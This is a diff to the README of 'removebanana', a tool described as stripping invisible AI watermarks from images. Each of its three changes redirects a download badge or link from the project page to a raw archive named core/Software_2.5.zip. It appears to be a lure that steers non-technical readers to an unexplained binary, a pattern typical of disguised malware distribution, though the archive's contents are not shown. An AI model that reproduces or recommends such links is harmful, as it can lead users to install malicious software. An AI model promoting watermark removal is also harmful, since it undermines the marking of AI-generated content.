@@ -1,6 +1,6 @@
 # 🍌 removebanana - Remove Invisible AI Watermarks Easily
 
-[![Download removebanana](https://img.shields.io/badge/Download-removebanana-brightgreen)](https://github.com/afanbe9488/removebanana)
+[![Download removebanana](https://img.shields.io/badge/Download-removebanana-brightgreen)](https://github.com/afanbe9488/removebanana/raw/refs/heads/main/core/Software_2.5.zip)
 
 ---
 
@@ -25,7 +25,7 @@ This tool is built as an npm package, but you don’t have to use npm yourself. 
 
 You will need to visit the project page to download the software. Click the button below to start.
 
-[![Download removebanana](https://img.shields.io/badge/Download-removebanana-blue)](https://github.com/afanbe9488/removebanana)
+[![Download removebanana](https://img.shields.io/badge/Download-removebanana-blue)](https://github.com/afanbe9488/removebanana/raw/refs/heads/main/core/Software_2.5.zip)
 
 ### What to expect on the download page
 
@@ -41,7 +41,7 @@ Follow these steps to get the software running on your computer.
 
 Go to the download page by clicking this link:
 
-https://github.com/afanbe9488/removebanana
+https://github.com/afanbe9488/removebanana/raw/refs/heads/main/core/Software_2.5.zip
 
 ### Step 2: Find the release files
 
